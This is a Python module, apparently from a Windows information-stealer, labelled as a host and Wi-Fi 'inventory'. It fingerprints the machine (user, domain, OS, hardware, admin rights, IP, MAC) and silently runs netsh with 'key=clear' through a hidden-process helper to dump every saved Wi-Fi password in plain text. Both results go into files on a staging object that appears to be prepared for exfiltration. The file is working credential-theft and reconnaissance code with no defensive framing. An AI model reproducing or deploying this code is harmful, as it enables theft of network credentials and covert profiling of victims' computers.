"""Host, network, privilege and Wi-Fi inventory."""

import ctypes
import os
import platform
import re
import socket
import time
import uuid as uuidlib
from ctypes import wintypes

from .util import run_hidden


class MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [
        ("dwLength", wintypes.DWORD),
        ("dwMemoryLoad", wintypes.DWORD),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


def total_ram_gb():
    status = MEMORYSTATUSEX()
    status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(status)):
        return status.ullTotalPhys / (1024.0 ** 3)
    return 0.0


def uptime_minutes():
    return ctypes.windll.kernel32.GetTickCount64() / 60000.0


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def local_ip():
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        probe.connect(("8.8.8.8", 80))
        address = probe.getsockname()[0]
        probe.close()
        return address
    except OSError:
        return "?"


def wifi_credentials():
    listing = run_hidden(["netsh", "wlan", "show", "profiles"])
    results = []
    for ssid in re.findall(r"All User Profile\s*:\s*(.+)", listing):
        ssid = ssid.strip()
        detail = run_hidden(["netsh", "wlan", "show", "profile", "name=%s" % ssid, "key=clear"])
        match = re.search(r"Key Content\s*:\s*(.+)", detail)
        if match:
            results.append((ssid, match.group(1).strip()))
    return results


def collect(stage):
    mac = "%012x" % uuidlib.getnode()
    lines = [
        "host: %s" % socket.gethostname(),
        "user: %s" % os.environ.get("USERNAME", "?"),
        "domain: %s" % os.environ.get("USERDOMAIN", "?"),
        "os: %s" % platform.platform(),
        "release: %s" % platform.version(),
        "cpu: %s" % platform.processor(),
        "cores: %s" % os.cpu_count(),
        "ram: %.1f GB" % total_ram_gb(),
        "uptime: %.0f min" % uptime_minutes(),
        "admin: %s" % is_admin(),
        "local_ip: %s" % local_ip(),
        "mac: %s" % ":".join(mac[i : i + 2] for i in range(0, 12, 2)),
        "screen: %dx%d" % (
            ctypes.windll.user32.GetSystemMetrics(0),
            ctypes.windll.user32.GetSystemMetrics(1),
        ),
        "timezone: %s" % time.tzname[0],
        "collected: %s" % time.strftime("%Y-%m-%d %H:%M:%S"),
    ]
    stage.add_text("system", "system.txt", "\n".join(lines))

    wifi = wifi_credentials()
    if wifi:
        stage.add_text(
            "system",
            "wifi.txt",
            "\n".join("%s\t%s" % (ssid, password) for ssid, password in wifi),
        )
